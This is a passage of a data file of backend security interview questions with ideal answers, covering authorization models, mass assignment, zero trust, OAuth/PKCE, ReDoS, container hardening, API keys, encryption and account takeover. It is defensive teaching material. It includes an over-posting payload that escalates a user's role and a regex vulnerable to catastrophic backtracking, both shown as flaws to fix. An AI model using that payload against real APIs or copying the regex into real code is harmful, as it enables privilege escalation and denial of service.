Spring Boot: \`server.servlet.session.cookie.http-only=true\`, \`secure=true\`, \`same-site=lax\`.

### Session fixation
If the session ID stays the same across login, an attacker who planted a known session ID in the victim's browser (e.g. via a link or subdomain cookie) is logged in as the victim afterwards. **Regenerate the session ID on authentication**. Spring Security does this by default (\`changeSessionId\`); don't disable it.

### Expiry
* **Idle timeout** (e.g. 30 minutes): \`server.servlet.session.timeout\`.
* **Absolute timeout** (e.g. 12 hours) regardless of activity.
* Invalidate server-side on logout (\`invalidateHttpSession\`, delete cookies).
* Re-authenticate for sensitive actions (change password, payout details).

### Scaling
Store sessions in Redis/JDBC with Spring Session so any instance can serve requests, and so sessions can be revoked centrally (e.g. 'log out all devices').`,
    pitfalls: [
      "Disabling session fixation protection.",
      "Sessions without absolute timeouts.",
      "Logout that only deletes the client cookie.",
    ],
    followUpQuestions: [
      "How would you implement 'log out of all devices'?",
      "Sessions or JWTs for a traditional web app?",
    ],
    faangFocus: "Solid web-security fundamentals.",
  },
  {
    id: 'sec-29',
    categoryId: 'security',
    title: 'Beyond Roles: ABAC, ReBAC and Policy Engines',
    difficulty: 'Expert',
    tags: ['ABAC', 'ReBAC', 'Authorization', 'OPA', 'Zanzibar'],
    scenario: "A document collaboration product has rules like 'editors of a folder can edit documents in it unless the document is locked, and external guests can only view during their sharing period'. Role checks are scattered across 80 services.",
    question: "How do you model and enforce complex authorization at scale?",
    idealAnswer: `### RBAC limits
Roles ('ADMIN', 'EDITOR') are coarse and global. Per-resource rules lead to **role explosion** ('EDITOR_OF_FOLDER_123').

### ABAC (attribute-based)
Decisions from attributes of the **subject** (department, clearance), **resource** (owner, locked, classification), **action**, and **environment** (time, location). Expressed as policies. Flexible, but policies can become hard to reason about.

### ReBAC (relationship-based)
Permissions derived from a **graph of relationships**: user → member of → group → editor of → folder → parent of → document. Google's **Zanzibar** model, implemented by SpiceDB, OpenFGA, AuthZed. Answers 'can Alice edit doc X?' by graph traversal, with consistency tokens to avoid 'new enemy' problems after permission changes. Great fit for sharing and collaboration.

### Policy engines and architecture
* **Externalise** decisions from code: **OPA** (Rego policies) or Cedar (AWS) for ABAC, OpenFGA/SpiceDB for ReBAC.
* **PEP/PDP split**: services are enforcement points; a decision point (library or sidecar) evaluates policies centrally. Policies are versioned, tested and audited.
* Performance: local evaluation with cached data, batch checks for lists ('which of these 500 docs can I see?' needs list/filter APIs, not 500 calls).

### In Spring
\`@PreAuthorize\` calling a bean that asks the PDP, or a custom \`AuthorizationManager\`.`,
    pitfalls: [
      "Encoding resource-specific permissions as roles.",
      "Authorization logic duplicated in every service.",
      "Per-item permission calls for large lists.",
    ],
    followUpQuestions: [
      "What is the 'new enemy' problem in Zanzibar?",
      "How would you filter search results by permissions efficiently?",
    ],
    faangFocus: "Staff-level authorization architecture question.",
  },
  {
    id: 'sec-30',
    categoryId: 'security',
    title: 'Mass Assignment and Over-Posting',
    difficulty: 'Solid',
    tags: ['Mass Assignment', 'DTOs', 'Data Binding', 'API Security'],
    scenario: "A `PUT /users/me` endpoint binds the request body directly to the `User` entity. A user sends `{\"name\":\"Eve\",\"role\":\"ADMIN\",\"balance\":1000000}` and gets both.",
    question: "Explain the vulnerability and how to prevent it.",
    idealAnswer: `### The flaw
Automatic data binding (Jackson, Spring MVC form binding) sets **every field present in the request** that exists on the target object. Binding directly to entities exposes internal fields (\`role\`, \`balance\`, \`tenantId\`, \`verified\`) to modification.

### Prevention
* **Request DTOs per use case** containing only the fields a client may set: \`record UpdateProfile(String name, String avatarUrl)\`. Map explicitly to the entity.
* Never bind request bodies to JPA entities.
* For form binding, restrict with \`@InitBinder\` allowed fields (fragile compared to DTOs).
* Jackson: \`FAIL_ON_UNKNOWN_PROPERTIES\` can make unexpected fields an error, which surfaces probing attempts (optional; it can hurt forward compatibility).

### Also check response DTOs
The mirror problem: returning entities exposes internal fields (password hashes, internal flags). Use response DTOs too.

### Tests
Send extra fields in tests and assert they are ignored or rejected, and that privileged fields are unchanged.`,
    pitfalls: [
      "Entities as request bodies.",
      "One DTO reused for create, update and admin endpoints.",
      "Returning entities in responses.",
    ],
    followUpQuestions: [
      "How would an admin endpoint that can change roles differ?",
      "How do records help here?",
    ],
    faangFocus: "A common real-world API flaw, easy to discuss concretely.",
  },
  {
    id: 'sec-31',
    categoryId: 'security',
    title: 'Zero Trust and Workload Identity',
    difficulty: 'Expert',
    tags: ['Zero Trust', 'mTLS', 'SPIFFE', 'Service Mesh'],
    scenario: "After an attacker pivoted from a compromised marketing service to the payments database, leadership mandates a 'zero trust' architecture.",
    question: "What does zero trust mean for backend services, and how would you implement it?",
    idealAnswer: `### The principle
**Never trust based on network location.** Every request is authenticated, authorised and encrypted, whether it comes from the internet or the pod next door. Assume breach and limit blast radius.

### Building blocks
* **Strong workload identity**: each service has a cryptographic identity (SPIFFE IDs like \`spiffe://acme/ns/payments/sa/api\`) issued automatically (SPIRE, service mesh CA), short-lived and rotated.
* **mTLS everywhere**: mesh sidecars or proxyless libraries authenticate both sides.
* **Service-level authorization policies**: 'only \`checkout\` may call \`payments\` POST /charges'. Deny by default.
* **End-user context propagation**: pass the user's identity (signed token) so downstream services authorise on behalf of the user, not just the calling service.
* **Least-privilege data access**: per-service database credentials (Vault dynamic secrets), no shared admin accounts.
* **Network segmentation** as an additional layer (Kubernetes NetworkPolicies, egress controls).
* Continuous verification: audit logs of service calls, anomaly detection.

### The pivot scenario
With these in place, the compromised marketing service has no identity allowed to reach payments, no credentials for the payments DB, and its unusual calls would be denied and logged.

### Rollout
Start with mTLS in permissive mode, observe traffic to build policies, then enforce service by service.`,
    pitfalls: [
      "Equating zero trust with buying a product.",
      "mTLS without authorization policies.",
      "Shared database credentials across services.",
    ],
    followUpQuestions: [
      "How does SPIRE attest workload identity?",
      "How do you propagate end-user identity through async messaging?",
    ],
    faangFocus: "Security architecture for senior and staff roles.",
  },
  {
    id: 'sec-32',
    categoryId: 'security',
    title: 'Threat Modelling With STRIDE',
    difficulty: 'Expert',
    tags: ['Threat Modeling', 'STRIDE', 'Secure Design'],
    scenario: "Your team is designing a new 'instant payout' feature that sends money to users' bank accounts. The security team asks for a threat model before implementation.",
    question: "How would you run a threat modelling session, and what threats would STRIDE surface here?",
    idealAnswer: `### The process
1. **What are we building?** A data flow diagram: actors, services, data stores, external systems (banking partner), and **trust boundaries**.
2. **What can go wrong?** Walk each element and flow with STRIDE.
3. **What will we do about it?** Mitigations, prioritised by risk.
4. **Did we do a good job?** Review, and revisit when the design changes.

### STRIDE applied to instant payouts
* **Spoofing**: account takeover then payout to attacker's bank. → MFA / step-up authentication for payouts and for changing bank details.
* **Tampering**: amount or destination changed in transit or in the queue. → TLS, signed messages, server-side recomputation of amounts.
* **Repudiation**: user claims they never requested it. → Immutable audit trail with device and IP data.
* **Information disclosure**: bank account numbers leaking via logs or APIs. → Masking, encryption at rest, least-privilege access.
* **Denial of service**: flooding payout requests, draining partner rate limits. → Rate limits, queues, per-user limits.
* **Elevation of privilege**: IDOR paying out from someone else's balance; support tool abuse. → Object-level authorization, four-eyes approval for manual payouts.

Plus business logic: new bank account + immediate payout = high fraud risk → **cooling-off period** and velocity limits; double payout on retries → idempotency keys.

### Outcome
Mitigations become tickets and tests; residual risks are accepted explicitly by owners.`,
    pitfalls: [
      "Threat modelling after the feature ships.",
      "Only technical threats, missing business-logic abuse.",
      "No follow-through on identified mitigations.",
    ],
    followUpQuestions: [
      "How do you prioritise threats (e.g. DREAD, risk matrix)?",
      "How often should threat models be revisited?",
    ],
    faangFocus: "Shows security leadership and design thinking.",
  },
  {
    id: 'sec-33',
    categoryId: 'security',
    title: 'OAuth for SPAs and Mobile Apps: PKCE and the BFF Pattern',
    difficulty: 'Expert',
    tags: ['PKCE', 'OAuth2', 'SPA', 'BFF', 'Public Clients'],
    scenario: "A React SPA uses the implicit flow and stores access tokens in localStorage. A mobile app embeds a client secret in its binary.",
    question: "What's wrong with both, and what are current best practices for public clients?",
    idealAnswer: `### Public clients can't keep secrets
Anything in a SPA bundle or mobile binary can be extracted. The embedded client secret is effectively public.

### Implicit flow is deprecated
It returns tokens in the URL fragment (leaks via history, referrers, logs) and offers no binding between the request and response. OAuth 2.1 removes it.

### Authorization code + PKCE
* The client creates a random **code_verifier** and sends its hash (**code_challenge**) with the authorisation request.
* When exchanging the code for tokens, it sends the verifier; the server checks it matches.
* A stolen authorisation code is useless without the verifier. Works without a client secret. Required for all clients in OAuth 2.1.

### Where to keep tokens in browsers
Tokens in \`localStorage\` are readable by any XSS. Options:
* **Backend-for-Frontend (BFF)**: the SPA talks only to its own backend, which performs the OAuth flow as a **confidential client** and keeps tokens server-side; the browser holds an **HttpOnly, Secure, SameSite** session cookie. Recommended for high-value apps (Spring Cloud Gateway or Spring Security's OAuth2 client can act as BFF).
* In-memory tokens with short lifetimes and refresh-token rotation if a BFF isn't possible.

### Mobile
Authorization code + PKCE through the **system browser** (AppAuth libraries), not embedded web views; claimed HTTPS redirect URIs; tokens in the platform keystore.`,
    pitfalls: [
      "Client secrets in public clients.",
      "Implicit flow in new applications.",
      "Tokens in localStorage.",
    ],
    followUpQuestions: [
      "How does PKCE prevent authorization code interception?",
      "What does DPoP add to token security?",
    ],
    faangFocus: "Modern OAuth best practice; commonly asked for full-stack and platform roles.",
  },
  {
    id: 'sec-34',
    categoryId: 'security',
    title: 'ReDoS and Resource Exhaustion Attacks',
    difficulty: 'Hard',
    tags: ['ReDoS', 'Regex', 'DoS', 'Resource Limits'],
    scenario: "A single request with a 50-character email address pins a CPU core at 100% for minutes. The validation regex is `^([a-zA-Z0-9]+\\.?)+@example\\.com$`.",
    question: "Explain ReDoS and other input-driven resource exhaustion attacks, and how to defend against them.",
    idealAnswer: `### Catastrophic backtracking
Java's regex engine is **backtracking**. Nested quantifiers over overlapping patterns like \`([a-z0-9]+\\.?)+\` give the engine exponentially many ways to split the input. When the match **fails** (no \`@example.com\` at the end), it tries them all: 2^n steps for n characters.

### Fixing regexes
* Remove ambiguity: \`^[a-zA-Z0-9]+(\\.[a-zA-Z0-9]+)*@example\\.com$\` (each character can only be matched one way).
* Possessive quantifiers (\`++\`) or atomic groups \`(?>...)\` stop backtracking.
* Limit input length **before** matching.
* Use well-tested validators instead of hand-written regexes; lint regexes in CI.
* For untrusted patterns (user-supplied regex), use a linear-time engine such as RE2/J.

### Other resource exhaustion vectors
* Huge JSON/XML payloads, deep nesting, enormous arrays (configure Jackson \`StreamReadConstraints\`, request size limits).
* **Zip bombs** and decompression bombs.
* Hash-collision flooding.
* Expensive queries triggered by user parameters (unbounded page sizes, wildcard searches).
* GraphQL query depth/complexity.

### General defences
Size and time limits on every input, bounded work per request (timeouts), rate limiting, and isolation (bulkheads) so one expensive request can't take down everything.`,
    pitfalls: [
      "Nested quantifiers in validation regexes.",
      "No input length limits.",
      "Unbounded page sizes and payload sizes.",
    ],
    followUpQuestions: [
      "Why doesn't RE2 have this problem?",
      "How would you cap the cost of a search endpoint?",
    ],
    faangFocus: "A concrete application-level DoS topic with a satisfying technical explanation.",
  },
  {
    id: 'sec-35',
    categoryId: 'security',
    title: 'Hardening Java Containers on Kubernetes',
    difficulty: 'Hard',
    tags: ['Containers', 'Kubernetes', 'Hardening', 'Least Privilege'],
    scenario: "A security scan of the cluster reports Java pods running as root, with writable filesystems, full JDK images with 400 known CVEs, and secrets exposed as environment variables.",
    question: "How would you harden Java services running on Kubernetes?",
    idealAnswer: `### Image
* Minimal base images: **distroless** Java or slim JRE images; a jlink'd runtime with only needed modules. Fewer packages, fewer CVEs.
* Pin versions and rebuild regularly to pick up patches; scan images (Trivy, Grype) in CI and in the registry.
* Sign images (Sigstore cosign) and verify signatures at admission.

### Runtime security context
* \`runAsNonRoot: true\` with a fixed UID; never root.
* \`readOnlyRootFilesystem: true\`, mounting an \`emptyDir\` for \`/tmp\` (the JVM needs a temp dir).
* \`allowPrivilegeEscalation: false\`, drop all Linux capabilities.
* Seccomp profile \`RuntimeDefault\`.
* Resource requests and limits.

### Secrets
Environment variables leak into crash dumps, \`/proc\`, logs of config dumps, and child processes. Prefer **mounted files** from a secrets manager (Vault agent, CSI Secrets Store) or fetching at startup via workload identity, with rotation.

### Network and access
NetworkPolicies (deny by default), no service account token automount unless needed, minimal RBAC for the service account.

### Application level
Expose Actuator endpoints only on a separate management port, not publicly; disable JMX remote or secure it; no debug ports in production images.`,
    pitfalls: [
      "Running the JVM as root.",
      "Full JDK and build tools in production images.",
      "Secrets in environment variables and Helm values files.",
    ],
    followUpQuestions: [
      "How do admission controllers enforce these policies?",
      "How would you get a heap dump from a read-only, distroless container?",
    ],
    faangFocus: "Practical platform security expected for cloud-native backend roles.",
  },
  {
    id: 'sec-36',
    categoryId: 'security',
    title: 'Designing a Secure API Key System',
    difficulty: 'Expert',
    tags: ['API Keys', 'Hashing', 'Rotation', 'Scopes'],
    scenario: "Your platform issues API keys to 50,000 customers. Currently keys are random strings stored in plaintext in the database, with full access to every endpoint and no expiry.",
    question: "Design a better API key system.",
    idealAnswer: `### Key format
\`acme_live_7Hk2...\` style keys:
* A **prefix** identifying the product and environment (enables secret scanners like GitHub's to detect leaked keys and notify you).
* A **public key ID** part for lookup, and a **secret** part with at least 128 bits of entropy from \`SecureRandom\`.

### Storage
Store only a **hash** of the secret (SHA-256 is fine here because the secret is high-entropy random, unlike passwords), keyed by the key ID. Look up by ID, then compare hashes in **constant time**. A database leak doesn't reveal usable keys. Show the full key to the customer **once** at creation.

### Authorisation and limits
* **Scopes** per key (read-only, payments:write), least privilege by default.
* Per-key **rate limits** and quotas.
* Optional restrictions: IP allowlists, allowed origins, expiry dates.
* Keys belong to an organisation and a creator for auditing.

### Lifecycle
* **Rotation without downtime**: allow multiple active keys; customers create a new key, deploy it, then revoke the old one.
* Revocation takes effect immediately (cache with short TTL or event-driven invalidation).
* Last-used timestamps to find stale keys; automatic expiry policies.
* Leak response: integrate with secret-scanning partner programs; auto-revoke and notify.

### Beyond keys
For high-value integrations, offer OAuth2 client credentials or signed requests (HMAC with timestamps), which avoid sending long-lived secrets on every request.`,
    pitfalls: [
      "Plaintext keys in the database.",
      "All-powerful keys without scopes.",
      "No rotation path, so customers never rotate.",
    ],
    followUpQuestions: [
      "Why is a fast hash acceptable here but not for passwords?",
      "How would you handle a leaked key reported by GitHub?",
    ],
    faangFocus: "An API platform design question combining crypto and product thinking.",
  },
  {
    id: 'sec-37',
    categoryId: 'security',
    title: 'Field-Level Encryption and Searching Encrypted Data',
    difficulty: 'Master',
    tags: ['Field-Level Encryption', 'Blind Index', 'Key Management', 'Compliance'],
    scenario: "Regulators require that national ID numbers and phone numbers be encrypted at the application level, so DBAs and database backups can't expose them. Customer support still needs to search customers by exact phone number.",
    question: "How would you design field-level encryption that still allows exact-match search?",
    idealAnswer: `### Why disk/TDE encryption isn't enough
Transparent database encryption protects against stolen disks, but anyone with SQL access (DBAs, attackers with DB credentials, backup readers) sees plaintext. **Application-level** encryption keeps data encrypted until the application decrypts it with keys from a KMS.

### Encryption design
* **AES-GCM** with random nonces per value (randomised encryption), via envelope encryption with keys in a KMS, and key versions in the ciphertext format.
* Associated data binding ciphertext to the row and column.
* Decryption only in services that need plaintext, with audit logging of access.

### Searching: blind indexes
Randomised encryption means equal values have different ciphertexts, so you can't query them. Add a **blind index** column: \`HMAC-SHA256(indexKey, normalise(phone))\`, truncated. Query \`WHERE phone_bidx = HMAC(key, normalise(input))\`, then decrypt candidates.
* Use a **separate key** for the index.
* Normalise inputs (E.164 phone format) before hashing.
* **Truncation** trades false positives for less leakage; low-entropy fields (e.g. 10-digit numbers) are brute-forceable if the index key leaks, so protect it like any key.
* Blind indexes leak **equality** (which rows share a value); assess whether that's acceptable.

### Other options
Deterministic encryption (AES-SIV) supports equality search directly but leaks equality in the same way; tokenisation vaults (the value lives in a separate hardened service); partial search via multiple blind indexes (last 4 digits). Range queries and full-text search on encrypted data are much harder.

### Operational aspects
Key rotation with re-encryption jobs, performance of decrypting large result sets, and ORM integration (JPA \`AttributeConverter\` or Hibernate column transformers).`,
    pitfalls: [
      "Deterministic encryption without understanding equality leakage.",
      "Using the same key for encryption and indexing.",
      "Unnormalised input causing missed searches.",
    ],
    followUpQuestions: [
      "How would you support 'search by last 4 digits'?",
      "How do you rotate the blind index key?",
    ],
    faangFocus: "Principal-level applied cryptography question for regulated industries.",
  },
  {
    id: 'sec-38',
    categoryId: 'security',
    title: 'Least Privilege and Defence in Depth',
    difficulty: 'Core',
    tags: ['Least Privilege', 'Defense in Depth', 'Security Principles'],
    scenario: "A service's database user is the schema owner with DROP rights, its cloud role has admin access, and the firewall is the only control between the internet and the database.",
    question: "Explain least privilege and defence in depth, applied to this service.",
    idealAnswer: `### Least privilege
Every identity (user, service, process) gets **only the permissions needed** for its job, for only as long as needed.
Applied here:
* Separate DB users: a **migration user** with DDL rights used only by the deploy job; a **runtime user** with only SELECT/INSERT/UPDATE (maybe no DELETE) on its own tables.
* Cloud role scoped to specific resources and actions (read from one bucket, publish to one topic).
* Pods not running as root, no unnecessary capabilities.
* Human access through just-in-time elevation with approval and audit.

### Defence in depth
Multiple **independent** layers, so one failure doesn't mean compromise:
* Network: firewall, private subnets, NetworkPolicies.
* Transport: TLS/mTLS.
* Application: authentication, authorisation, input validation, output encoding.
* Data: encryption, least-privilege DB access, row-level security.
* Detection: audit logs, alerting, anomaly detection.
* Recovery: backups, incident response.

With only a firewall, one misconfiguration or one compromised internal host exposes the database completely.

### Mindset
Assume each layer **will** fail at some point and ask what stops the attacker next.`,
    pitfalls: [
      "Runtime services connecting as schema owners.",
      "A single perimeter as the whole security model.",
      "Standing admin access for humans.",
    ],
    followUpQuestions: [
      "How do you manage separate DB users with Flyway and Spring?",
      "What is just-in-time access?",
    ],
    faangFocus: "Foundational principles expected from anyone designing systems.",
  },
  {
    id: 'sec-39',
    categoryId: 'security',
    title: 'Passkeys, WebAuthn and Multi-Factor Authentication',
    difficulty: 'Solid',
    tags: ['Passkeys', 'WebAuthn', 'MFA', 'Phishing Resistance'],
    scenario: "After a phishing campaign captured both passwords and SMS codes of several employees, the company decides SMS MFA is not enough.",
    question: "Compare MFA methods and explain why passkeys resist phishing.",
    idealAnswer: `### MFA methods, weakest to strongest
* **SMS/voice codes**: vulnerable to SIM swapping, interception, and real-time phishing (the fake site relays the code).
* **TOTP apps**: better than SMS, but still phishable: users type the code into the attacker's site.
* **Push approval**: vulnerable to **MFA fatigue** attacks unless number matching is used.
* **FIDO2/WebAuthn** (security keys, **passkeys**): phishing-resistant.

### Why WebAuthn resists phishing
Registration creates a **key pair per site**; the private key never leaves the authenticator (device secure enclave, security key, or synced passkey provider). Login signs a server challenge, and the browser includes the **origin**; the credential is scoped to the relying party ID. A lookalike domain simply can't use the credential: there's nothing for the user to type or relay.

### Passkeys
Discoverable WebAuthn credentials, synced across a user's devices by the platform (Apple, Google, Microsoft, password managers). They can **replace passwords** entirely, not just add a factor.

### Java implementation
Libraries like Yubico's \`java-webauthn-server\` or WebAuthn4J; Spring Security 6.4+ includes passkey support. Store public keys, credential IDs and sign counters per user. Keep account recovery strong, because it becomes the weakest link.`,
    pitfalls: [
      "Treating SMS as strong MFA.",
      "Weak account recovery undermining strong MFA.",
      "Push MFA without number matching.",
    ],
    followUpQuestions: [
      "How does the relying party ID prevent phishing?",
      "How would you design account recovery for passkey users?",
    ],
    faangFocus: "Modern authentication knowledge increasingly asked in security-conscious companies.",
  },
  {
    id: 'sec-40',
    categoryId: 'security',
    title: 'Defending Against Account Takeover at Scale',
    difficulty: 'Master',
    tags: ['Account Takeover', 'Credential Stuffing', 'Bot Detection', 'Risk-Based Auth'],
    scenario: "A consumer app sees 30 million login attempts per day from rotating residential IPs using leaked username/password lists. Thousands of accounts are compromised weekly despite per-IP rate limits.",
    question: "Design a layered defence against credential stuffing and account takeover.",
    idealAnswer: `### Why per-IP limits fail
Attackers use huge **residential proxy** pools; each IP makes a handful of attempts. Credentials are valid (reused from other breaches), so each attempt looks legitimate.

### Layers
1. **Reduce password value**: passkeys and MFA (phishing-resistant where possible); encourage adoption with UX incentives.
2. **Breached password checks**: reject passwords seen in breaches at signup and change (HIBP k-anonymity API); force resets for users found in fresh breach dumps.
3. **Bot detection**: device fingerprinting, browser integrity signals, behavioural biometrics, TLS/HTTP fingerprints (JA3/JA4), proof-of-work or CAPTCHA challenges only for risky traffic.
4. **Rate limiting on multiple dimensions**: per account, per device fingerprint, per ASN/subnet, global failure-rate anomalies, not just per IP.
5. **Risk-based authentication**: score each login (new device, impossible travel, known-bad IP reputation, velocity) and **step up** (MFA, email confirmation) or block.
6. **Post-login protection**: notify users of new-device logins, protect sensitive actions (change email, add payout method) with re-authentication and cooling-off periods, session revocation.
7. **Detection and response**: dashboards of login success and failure ratios, automated responses when attacks spike, and account recovery workflows.

### Engineering considerations
Consistent response times and messages (no user enumeration), privacy-conscious fingerprinting, and careful tuning to avoid locking out real users (account lockouts themselves become a DoS vector).`,
    pitfalls: [
      "Relying solely on per-IP rate limits.",
      "Hard lockouts that attackers can use to lock out real users.",
      "Revealing whether a username exists.",
    ],
    followUpQuestions: [
      "How does the HIBP k-anonymity model protect privacy?",
      "How would you measure the effectiveness of these defences?",
    ],
    faangFocus: "A principal-level security design question for consumer-scale platforms.",
  },
];
